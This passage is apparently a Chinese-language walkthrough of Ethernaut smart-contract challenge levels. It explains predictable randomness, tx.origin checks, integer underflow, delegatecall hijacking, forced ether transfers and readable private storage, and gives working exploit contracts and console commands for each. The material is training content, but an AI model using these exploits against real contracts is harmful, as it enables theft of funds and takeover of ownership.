<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">flip</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">));</span>

<span class="w">    </span><span class="c1">// ÂΩìÂâçÂå∫ÂùóÂè∑‰∏çËÉΩÁ≠â‰∫é‰∏ä‰∏ÄÂå∫ÂùóÂè∑ÔºåÊÑèÂë≥ÁùÄ‰∏çËÉΩ‰ΩøÁî®Âæ™ÁéØÈáçÂ§çË∞ÉÁî® flip</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">lastHash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">revert</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">lastHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">FACTOR</span><span class="p">;</span>
<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">side</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
<span class="w">    </span><span class="nx">CoinFlip</span><span class="w"> </span><span class="nx">coin</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">coin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CoinFlip</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">));</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">FACTOR</span><span class="p">;</span>
<span class="w">        </span><span class="nx">bool</span><span class="w"> </span><span class="nx">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">        </span><span class="nx">coin</span><span class="p">.</span><span class="nx">flip</span><span class="p">(</span><span class="nx">side</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>‰ΩøÁî® Remix ÈÉ®ÁΩ≤ÂêàÁ∫¶</p>
<p><img alt="ÈÉ®ÁΩ≤ÂêàÁ∫¶" src="../img/ethernaut01.jpg" /></p>
<p>ÊâßË°å 10 Ê¨° <code>exploit</code> ÂáΩÊï∞</p>
<p><img alt="Êé∑Á°¨Â∏Å XD" src="../img/ethernaut02.jpg" /></p>
<p>ÂèØ‰ª•‰ΩøÁî® <a href="https://docs.chain.link/docs/get-a-random-number">Chainlink VRF</a> Êù•Ëé∑ÂæóÂÆâÂÖ®ÁöÑÈöèÊú∫Êï∞</p>
<h3 id="_3">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<p><a href="https://remix-ide.readthedocs.io/en/latest/run.html">Deploy &amp; Run ‚Äî Remix - Ethereum IDE 1 documentation</a></p>
<h2 id="4-telephone">4. Telephone<a class="headerlink" href="#4-telephone" title="Permanent link">&para;</a></h2>
<p>Â£∞ÊòéÂêàÁ∫¶ÁöÑÊâÄÊúâÊùÉ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Telephone</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">changeOwner</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// tx.origin - ‰∫§ÊòìÁöÑÂèëËµ∑ËÄÖ</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_owner</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>Áî®Êà∑ÈÄöËøáÂêàÁ∫¶ A Ë∞ÉÁî®ÂêàÁ∫¶ B<ul>
<li>ÂØπ‰∫éÂêàÁ∫¶ AÔºö<code>tx.origin</code> Âíå <code>msg.sender</code> ÈÉΩÊòØÁî®Êà∑</li>
<li>ÂØπ‰∫éÂêàÁ∫¶ BÔºö<code>tx.origin</code> ÊòØÁî®Êà∑Ôºå<code>msg.sender</code> ÊòØÂêàÁ∫¶ A</li>
</ul>
</li>
<li>ÂΩì‰∫§ÊòìÂèëËµ∑ËÄÖÁöÑÂú∞ÂùÄ‰∏éÂΩìÂâçË∞ÉÁî®ËÄÖÁöÑÂú∞ÂùÄ‰∏çÁõ∏ÂêåÊó∂ÔºåÂèØ‰ª•Êõ¥Êñ∞ÂêàÁ∫¶ÊâÄÊúâËÄÖÔºåÊòæÁÑ∂ÈúÄË¶ÅÈÄöËøáÂè¶‰∏Ä‰∏™ÂêàÁ∫¶Êù•Ë∞ÉÁî® <code>changeOwner</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Telephone</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">changeOwner</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_owner</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">Telephone</span><span class="w"> </span><span class="nx">tele</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tele</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Telephone</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tele</span><span class="p">.</span><span class="nx">changeOwner</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="5-token">5. Token<a class="headerlink" href="#5-token" title="Permanent link">&para;</a></h2>
<p>Â¢ûÂä†Êâã‰∏≠ token ÁöÑÊï∞ÈáèÔºåË∂äÂ§öË∂äÂ•ΩÔºàÂàùÂßã 20 ‰∏™Ôºâ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Token</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="c1">// Êó†Á¨¶Âè∑Êï¥Êï∞Á±ªÂûã</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">totalSupply</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">totalSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_value</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">_value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// ‰ºöÂèëÁîüÊï¥Êï∞Ê∫¢Âá∫ÔºåÊú™‰ΩøÁî® SafeMath Ê£ÄÊü•</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">_value</span><span class="p">;</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">_value</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">balance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_owner</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>ÈÄöËøá‰∏ãÊ∫¢Âá∫Êù•Ëé∑Âæó token</p>
<div class="highlight"><pre><span></span><code><span class="c1">// ËΩ¨ÁªôÈô§Ëá™Â∑±Â§ñÁöÑ‰ªªÊÑèÂú∞ÂùÄ</span>
<span class="c1">// ËΩ¨ÁªôËá™Â∑±ÁöÑËØùÔºåÂ∞±ÂÖà‰∏ãÊ∫¢Âá∫ÂÜç‰∏äÊ∫¢Âá∫‰∫Ü...</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">address</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="mf">21</span><span class="p">)</span>
</code></pre></div>
<h2 id="6-delegation">6. Delegation<a class="headerlink" href="#6-delegation" title="Permanent link">&para;</a></h2>
<p>Â£∞ÊòéÂØπÂêàÁ∫¶ÂÆû‰æãÁöÑÊâÄÊúâÊùÉ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Delegate</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_owner</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">pwn</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Delegation</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>
<span class="w">  </span><span class="nx">Delegate</span><span class="w"> </span><span class="nx">delegate</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_delegateAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">delegate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Delegate</span><span class="p">(</span><span class="nx">_delegateAddress</span><span class="p">);</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// Ê≤°Êúâ payableÔºå‰∏çËÉΩ‰ΩøÁî®ËΩ¨Ë¥¶Êù•Ëß¶Âèë fallback</span>
<span class="w">  </span><span class="c1">// ÂêåÊó∂ÔºåÈÄöËøáËΩ¨Ë¥¶Êù•Ëß¶Âèë fallback ÂáΩÊï∞‰∏çËÉΩÂä†‰ªª‰Ωï data</span>
<span class="w">  </span><span class="nx">fallback</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">result</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">).</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">this</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>‰ª£ÁêÜË∞ÉÁî®Âè™‰ΩøÁî®ÁªôÂÆöÂú∞ÂùÄÁöÑ‰ª£Á†ÅÔºåÂÖ∂‰ªñÂ±ûÊÄßÈÉΩÂèñËá™ÂΩìÂâçÂêàÁ∫¶</li>
<li>‰ΩøÁî®ÂêàÁ∫¶ <code>Delegate</code> ÁöÑ <code>pwn</code> ÂáΩÊï∞Êù•‰øÆÊîπÂêàÁ∫¶ <code>Delegation</code> ÁöÑÊâÄÊúâËÄÖ</li>
<li>Èô§‰∫ÜÂêëÂêàÁ∫¶ËΩ¨Ë¥¶‰ºöËß¶Âèë <code>fallback</code> ÂáΩÊï∞Â§ñÔºåËã•Ë¢´Ë∞ÉÁî®ÁöÑÂáΩÊï∞‰∏çÂ≠òÂú®ÂêåÊ†∑‰ºöËß¶Âèë</li>
<li>
<p>Ë∞ÉÁî® <code>Delegation</code> ‰∏çÂ≠òÂú®ÁöÑÂáΩÊï∞ <code>pwn</code> Êù•Ëß¶Âèë <code>fallback</code> ÂáΩÊï∞Ôºå‰ªéËÄåÊâßË°åÁúüÊ≠£ÁöÑ <code>pwn</code> ÂáΩÊï∞</p>
<div class="highlight"><pre><span></span><code><span class="c1">// keccak256 Âç≥ sha3</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;pwn()&quot;</span><span class="p">)})</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
</code></pre></div>
</li>
<li>
<p>‰ª£ÁêÜË∞ÉÁî®ÂäüËÉΩÂº∫Â§ß‰∏îÂç±Èô©ÔºåÊÖéÁî® üëÄ</p>
</li>
</ul>
<h3 id="_4">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/SHA-3">SHA-3 - Áª¥Âü∫ÁôæÁßëÔºåËá™Áî±ÁöÑÁôæÁßëÂÖ®‰π¶</a></li>
<li><a href="https://web3js.readthedocs.io/en/v1.7.0/web3-utils.html?highlight=sha3#sha3">sha3</a></li>
</ul>
<h2 id="7-force">7. Force<a class="headerlink" href="#7-force" title="Permanent link">&para;</a></h2>
<p>‰ΩøÂêàÁ∫¶ÁöÑ‰ΩôÈ¢ùÂ§ß‰∫é 0</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Force</span><span class="w"> </span><span class="p">{</span><span class="cm">/*</span>

<span class="cm">                   MEOW ?</span>
<span class="cm">         /\_/\   /</span>
<span class="cm">    ____/ o o \</span>
<span class="cm">  /~____  =√∏= /</span>
<span class="cm"> (______)__m_m)</span>

<span class="cm">*/</span><span class="p">}</span>
</code></pre></div>
<ul>
<li>ÂΩìÂêàÁ∫¶Ëá™ÊØÅÊó∂ÔºåÂêàÁ∫¶‰ΩôÈ¢ùÂ∞ÜËΩ¨ÁªôÊåáÂÆöÁõÆÊ†á<ul>
<li>Âç≥‰ΩøÂêàÁ∫¶‰ª£Á†Å‰∏çÂåÖÂê´ <code>selfdestruct</code> ÁöÑË∞ÉÁî®Ôºå‰ªçÁÑ∂ÂèØ‰ª•ÈÄöËøá <code>delegatecall</code> Êàñ <code>callcode</code> Êù•ÊâßË°åËá™ÊØÅÊìç‰Ωú</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">pay</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Â£∞Êòé payable ÁöÑÂáΩÊï∞ÂíåÂú∞ÂùÄÈÉΩÂèØ‰ª•Êé•ÂèóËΩ¨Ë¥¶</span>
<span class="w">    </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">payable</span><span class="p">(</span><span class="nx">instance</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>Âú® Remix ÂêëÂêàÁ∫¶ <code>Hack</code> ËΩ¨Ë¥¶</p>
<p><img alt="ÂÖàÂ°´ÂÜô valueÔºåÂÜçÁÇπÂáª pay" src="../img/ethernaut03.jpg" /></p>
<ul>
<li>Â¶ÇÊûúÂêàÁ∫¶‰∏≠ÂåÖÂê´Â£∞Êòé‰∫Ü <code>payable</code> ÁöÑ <code>receive</code> Êàñ <code>fallback</code> ÂáΩÊï∞Ôºå‰πüÂèØ‰ª•Âú®Â°´ÂÜôÂÆå <code>VALUE</code> ÂêéÁõ¥Êé•ÁÇπÂáª„ÄåTransact„ÄçÔºõÊàñÈÄöËøáÂ£∞Êòé‰∫Ü <code>payable</code> ÁöÑÊûÑÈÄ†ÂáΩÊï∞ÔºåÂú®ÂàõÂª∫ÂêàÁ∫¶Êó∂ËΩ¨Ë¥¶</li>
<li>ÈÄöËøáËá™ÊØÅÁöÑËΩ¨Ë¥¶ÊñπÂºèÊó†Ê≥ïÈòªÊ≠¢ÔºåÂõ†Ê≠§‰ªª‰ΩïÂêàÁ∫¶ÈÄªËæëÈÉΩ‰∏çÂ∫îÂü∫‰∫é <code>address(this).balance == 0</code></li>
</ul>
<h3 id="_5">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.soliditylang.org/en/v0.8.12/introduction-to-smart-contracts.html?highlight=destruct#deactivate-and-self-destruct">Deactivate and Self-destruct</a></li>
<li><a href="https://solidity-by-example.org/payable/">Payable | Solidity by Example</a></li>
<li><a href="https://remix-ide.readthedocs.io/en/latest/udapp.html?highlight=contract#low-level-interactions">Low level interactions</a></li>
</ul>
<h2 id="8-vault">8. Vault<a class="headerlink" href="#8-vault" title="Permanent link">&para;</a></h2>
<p>Ëß£ÈîÅ‰øùÈô©Êüú</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Vault</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">locked</span><span class="p">;</span>
<span class="w">  </span><span class="nx">bytes32</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">password</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="nx">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_password</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">unlock</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_password</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">password</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>ÁåúÂØÜÁ†ÅÊòØ‰∏çÂèØËÉΩÁåúÁöÑ~ XD</li>
<li>Âå∫ÂùóÈìæ‰∏äÊâÄÊúâ‰ø°ÊÅØÈÉΩÊòØÂÖ¨ÂºÄÁöÑÔºåÂåÖÊã¨Â£∞Êòé‰∏∫ <code>private</code> ÁöÑÂèòÈáè</li>
